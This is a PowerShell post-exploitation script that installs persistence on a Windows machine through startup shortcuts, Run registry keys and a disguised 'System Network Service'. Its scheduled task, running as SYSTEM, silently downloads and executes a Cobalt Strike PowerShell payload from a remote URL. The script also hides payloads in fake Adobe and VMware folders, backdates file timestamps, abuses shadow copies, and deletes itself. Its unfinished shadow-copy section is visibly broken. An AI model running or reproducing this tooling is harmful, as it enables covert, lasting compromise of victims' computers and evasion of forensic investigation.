<#
    .SYNOPSIS
        This script will configure one to four types of peristence on a computer: scheduled task, shortcut in start menu, RUN registry keys, and a service that autostarts.
    
    .DESCRIPTION
        The script takes parameters that determine which peristence mechanisms you want to use and the binary files to use.

    .EXAMPLE
        ./persistence.ps1 -Shortcut short.exe -Run run.exe -Service service.exe -Schtask "http://1.1.1.1/a"

    .PARAMETER Shortcut 
        File to use for the shortcut link. File will be saved to c:\programdata\adobe\reader\ and the link will be placed in 
		C:\programdata\microsoft\windows\start menu\programs\startup\ and C:\users\username\appdata\roaming\microsoft\windows\start menu\programs\startup\.
        The file's timestamps will be altered to 3 years from today plus a random number of days between 1 and 100.
    
     .PARAMETER Run
        File to use for the run keys. File will be saved to C:\programdata\VMware\ and C:\users\username\appdata\roaming\VMware\.
        The file's timestamps will be altered to 3 years from today plus a random number of days between 1 and 100.
        Run keys in HKLM:\Software\wow6432node\microsoft\windows\currentversion\run\, HKLM:\Software\microsoft\windows\currentversion\run\,
        and HKCU:\Software\microsoft\windows\currentversion\run\, HKCU:\Software\wow6432node\microsoft\windows\currentversion\run\
    
     .PARAMETER Service
        File to use for the service that will be created. Should be created as a service binary in Cobalt Strike payload generator.
        The file will be saved as C:\Windows\System32\netsrvc.exe and will not be viewable in explorer.
        The file's timestamps will be altered to 3 years from today plus a random number of days between 1 and 100.
        The new service will be set to automatic, named "System Network Service", and started. Once started, it runs and then stops but will run on startup.
    
     .PARAMETER Schtask
        URL to the powershell one liner hosted by a Cobalt Strike server. URL is used in a scheduled task that runs on startup by System.

     .PARAMETER Vss
        File to use for the run key pointing to exe in volume shadow copy restore point.
     
    .NOTES
        NAME: persistence.ps1
        AUTHOR: Jennifer Gates 
        VERSION: 1.2
        LASTEDIT: 15 May 2016
        CHANGELOG:
            1.0 (14 May 2016) - Initial script.
            1.01 (15 May 2016) - minor command fixes
            1.2 (15 May 2016) - added clean up of files and changing of time stamps
            1.3 (16 May 2016) - added line to run the scheduled task after creation and line to delete script when done running
            1.4 (18 May 2016) - adding capability to save file in VSS and reference it in a shortcut/run key/service)

#>

#-------------------------------- Parameters --------------------------------#

Param(
   [string]$Shortcut,
   [string]$Run,
   [string]$Service,
   [string]$Schtask,
   [string]$Vss

)

#-------------------------------- Functions --------------------------------#
Function Set-FileTimeStamps

{

 Param (

    [Parameter(mandatory=$true)]
    [string[]]$path
)
    
    $rand = Get-Random -minimum 1 -maximum 101
    $item = get-item $path
    $date = get-date
    $date = $date.addYears(-3)
    $date = $date.addDays($rand)
    $item.CreationTime = $date
    $item.LastAccessTime = $date
    $item.LastWriteTime = $date


} #end function Set-FileTimeStamps



# -------------------------Creating Startup Shortcuts -------------------------#

if ($Shortcut) {
	Write-Host "[-] Creating Startup Shortcuts for $Shortcut"
	if (!(test-path "C:\programdata\adobe")) {
		new-item "C:\programdata\" adobe -type Directory
        set-FileTimeStamps -path "C:\programdata\adobe"
		} 
	if (!(test-path "C:\programdata\adobe\reader")) {
		new-item "C:\programdata\adobe\reader" -type Directory
        set-FileTimeStamps -path "C:\programdata\adobe\reader"
		} 	
	copy $shortcut "C:\programdata\adobe\reader\$Shortcut"
    set-FileTimeStamps -path "C:\programdata\adobe\reader\$Shortcut"
	$ShortcutName = $Shortcut.substring(0,$Shortcut.length-4)
	$objShell = New-Object -ComObject ("WScript.Shell")
	$objShortCut = $objShell.CreateShortcut($env:USERPROFILE + "\appdata\roaming\microsoft\windows\Start Menu\Programs\Startup\" + $ShortcutName +".lnk")
	$objShortCut.TargetPath="C:\programdata\adobe\reader\$Shortcut"
	$objShortCut.Save()
	copy "$ENV:USERPROFILE\appdata\roaming\microsoft\windows\start menu\programs\startup\$ShortcutName.lnk" "C:\programdata\microsoft\windows\start menu\programs\startup\$ShortcutName.lnk"
    set-FileTimeStamps -path "$ENV:USERPROFILE\appdata\roaming\microsoft\windows\start menu\programs\startup\$ShortcutName.lnk"
    set-FileTimeStamps -path "C:\programdata\microsoft\windows\start menu\programs\startup\$ShortcutName.lnk"
}

# -------------------------Creating Scheduled Task -------------------------#
if ($Schtask) {
	write-host "[-] Creating Scheduled Task named MicrosoftOfficeUpdater"
	$taskexist = schtasks /tn "MicrosoftOfficeUpdater" 
	if (!$taskexist) {
        schtasks /delete /tn MicrosoftOfficeUpdater /F
    }
	schtasks /create /tn MicrosoftOfficeUpdater /TR "C:\windows\syswow64\windowspowershell\v1.0\powershell.exe -windowstyle hidden -nologo -noninteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''$Schtask'''))'" /sc onstart /ru system
	schtasks /run /tn MicrosoftOfficeUpdater
}

# ----------------------------Creating RUN Keys -----------------------------#
if($Run){
	write-host "[-] Creating RUN keys for $run"
	if (!(test-path "C:\programdata\VMware")) {
			new-item "C:\programdata\VMware" -type Directory
            set-FileTimeStamps -path "C:\programdata\VMware"
	} 
	if (!(test-path "$env:USERPROFILE\appdata\roaming\VMware")) {
		new-item "$env:USERPROFILE\appdata\roaming\VMware" -type Directory
        set-FileTimeStamps -path "$env:USERPROFILE\appdata\roaming\VMware"
	}
	copy $Run "C:\programdata\VMware\$Run"
    set-FileTimeStamps -path "C:\programdata\VMware\$Run"
	copy $Run "$env:USERPROFILE\appdata\roaming\VMware\$Run"
	set-FileTimeStamps -path "$env:USERPROFILE\appdata\roaming\VMware\$Run"
    
	New-Itemproperty -Path HKLM:\Software\microsoft\windows\currentversion\run\ -Name VMware -Value "C:\programdata\VMware\$Run" -Force
	New-Itemproperty -Path HKCU:\Software\microsoft\windows\currentversion\run\ -Name VMware -Value "C:\programdata\VMware\$Run" -Force
	
	if (test-path "HKLM:\Software\wow6432node\microsoft\windows\currentversion\run\") {
		New-Itemproperty -Path HKLM:\Software\wow6432node\microsoft\windows\currentversion\run\ -Name VMware -Value "C:\programdata\VMware\$Run" -Force
	}
	
	if (test-path "HKCU:\Software\wow6432node\microsoft\windows\currentversion\run\") {
		New-Itemproperty -Path HKCU:\Software\wow6432node\microsoft\windows\currentversion\run\ -Name VMware -Value "C:\programdata\VMware\$Run" -Force
	}
}
		
# ----------------------------Creating service -----------------------------#
if($Service) {
	Write-host "[-] Creating System Network Service (netsrvc)" 
	
	$serviceNameExist = Get-service -name netsrvc -ea silentlycontinue 
	if ($serviceNameExist) {
		write-host "     netsrvc exists"
		get-service -name netsrvc | stop-service
		write-host "     Deleting netsrvc"
		sc.exe delete netsrvc 
	}
	$serviceDisplayExist = Get-service -DisplayName "System Network Service" -ea silentlycontinue 
	if ($serviceDisplayExist) {
		write-host "     System Network Service exists"
		get-service -displayname "System Network Service" | stop-service
		$deleteService = get-service -displayname "System Network Service"
		write-host "     Deleting $deleteService.Name"
		sc.exe delete $deleteService.Name 
	}	
	copy $Service "C:\Windows\System32\netsrvc.exe"
    set-FileTimeStamps -path "C:\Windows\System32\netsrvc.exe"
	New-service -Name "netsrvc" -Description "Identifies the networks to which the computer has connected, collects and stores information, and assures connectivity." -DisplayName "System Network Service" -startupType "Automatic" -binarypathname "C:\windows\system32\netsrvc.exe"
	Start-service netsrvc
}

#------------ start VSS Service UNFINISHED Might not be possible------------------------#
<#intent is to reference a file that has been deleted but is in previous copies but
may not work.
Might be an idea to just turn off or reset vss in a way that destroys previous copies
#>

#copy the payload exe to a folder on the drive

copy $Vss "C:\Windows\System32\vss.exe"

start-service vss  
$SysRestoredate = get-date
checkpoint-computer -description $SysRestoreDate
$restorePath = $shadowcopy.deviceObject + "Windows\System32\vss.exe"
cmd.exe /c  %SYSTEMROOT%\system32\wbem\wmic.exe process call create $restorePath



#get the path to the device shadow copy
#need full path to the file within the shadow copy

$shadowcopy = get-wmiobject -class win32_shadowcopy | select-object
cmd.exe /c %SYSTEMROOT%\\system32\\wbem\\wmic.exe process call create \\\\?\\GLOBALROOT\\Device\\#{volume_id}\\#{exe_path}"
cmd /c mklink c:\temp\win32_interop $shadowcopy.deviceobject

# ---------------------------- Cleanup files -----------------------------#
if($Service) {
    del $Service
}
if ($Run) {
    del $Run
}
if ($Shortcut) {
    del $Shortcut
}

#remove the script itself
Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force